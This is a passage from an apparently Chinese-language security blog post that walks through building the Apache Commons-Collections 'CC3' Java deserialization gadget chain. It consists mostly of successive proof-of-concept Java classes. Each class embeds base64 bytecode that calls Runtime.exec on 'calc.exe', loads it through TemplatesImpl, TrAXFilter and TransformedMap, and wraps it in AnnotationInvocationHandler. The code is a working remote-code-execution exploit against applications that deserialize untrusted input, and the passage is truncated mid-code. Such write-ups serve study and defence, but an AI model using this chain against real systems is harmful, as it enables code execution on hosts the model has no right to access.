class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA4ADwcAHAwAHQAeAQAIY2FsYy5leGUMAB8AIAEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAUAAsAAAAEAAEADAABAA4ADwACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABUABAAWAA0AFwALAAAABAABABAAAQARAAAAAgAS&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;adam&quot;</span>);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldVaule</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj,value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h5><p>这个只是正向的，我们要反向的时候走一波</p><p>正向的时候是 <code>Map.put()</code>触发的，那么我们要找的就是一个类的<code>readObject()</code>，能够触发这个<code>Map.put</code>最终是<code>MapEntry#setValue()</code>触发的，会触发<code>TransformedMap</code>的<code>transfrom()</code>。然后把CC1 的那个<code>AnnotationInvocationHandler</code>给拿过来了。</p><p>最后：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testt</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA4ADwcAHAwAHQAeAQAIY2FsYy5leGUMAB8AIAEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAUAAsAAAAEAAEADAABAA4ADwACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABUABAAWAA0AFwALAAAABAABABAAAQARAAAAAgAS&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;adam&quot;</span>);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = serialize(handler);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes1));</span><br><span class="line">        unserialize(bytes1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes); <span class="comment">// 这个是写入，自然是先流进来的。所以它要有参数</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);<span class="comment">//将流进行反序列化的，所以需要流流入，所以他需要一个参数</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();<span class="comment">//输出的，数据流入它，所以它是作为其他流的输入的。它最后是输出用的</span></span><br><span class="line">        <span class="comment">// 这里是用 ByteArrayOutputStram()来盛放。</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);<span class="comment">//ObjectOutputStram(new FileOutputStream)一定要有一个输出兑现，他要把生成的字节给一个东西放着，</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldVaule</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是出问题了，在<code>outermap.put()</code>之后就停掉了</p><p><strong>是我们要换为 fake 的才行，然后后面用反射设置私有属性，再给他换成正确的来。</strong></p><p>更改如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA4ADwcAHAwAHQAeAQAIY2FsYy5leGUMAB8AIAEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAUAAsAAAAEAAEADAABAA4ADwACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABUABAAWAA0AFwALAAAABAABABAAAQARAAAAAgAS&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;adam&quot;</span>);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// fake的</span></span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">            )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Transformer transformerChain = new ChainedTransformer(transformers);</span></span><br><span class="line">        <span class="comment">//先使用fake</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//换为真的</span></span><br><span class="line">        setFieldVaule(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = serialize(handler);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes1));</span><br><span class="line">        unserialize(bytes1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes); <span class="comment">// 这个是写入，自然是先流进来的。所以它要有参数</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);<span class="comment">//将流进行反序列化的，所以需要流流入，所以他需要一个参数</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();<span class="comment">//输出的，数据流入它，所以它是作为其他流的输入的。它最后是输出用的</span></span><br><span class="line">        <span class="comment">// 这里是用 ByteArrayOutputStram()来盛放。</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);<span class="comment">//ObjectOutputStram(new FileOutputStream)一定要有一个输出兑现，他要把生成的字节给一个东西放着，</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldVaule</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这样仍然不会弹计算器</p><p>最后发现：</p><p>应该把 <code>outerMap.put</code>换成<code>innerMap</code></p><p>最后就形成了最终POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA4ADwcAHAwAHQAeAQAIY2FsYy5leGUMAB8AIAEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAUAAsAAAAEAAEADAABAA4ADwACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABUABAAWAA0AFwALAAAABAABABAAAQARAAAAAgAS&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;adam&quot;</span>);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// fake的</span></span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span 